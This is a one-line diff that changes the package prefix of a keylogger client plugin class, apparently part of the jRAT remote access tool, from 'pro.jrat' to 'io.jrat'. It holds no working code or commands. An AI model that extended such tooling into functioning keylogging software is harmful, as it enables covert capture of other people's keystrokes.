@@ -1,1 +1,1 @@
-pro.jrat.plugin.keylogger.client.ClientPlugin
+io.jrat.plugin.keylogger.client.ClientPlugin
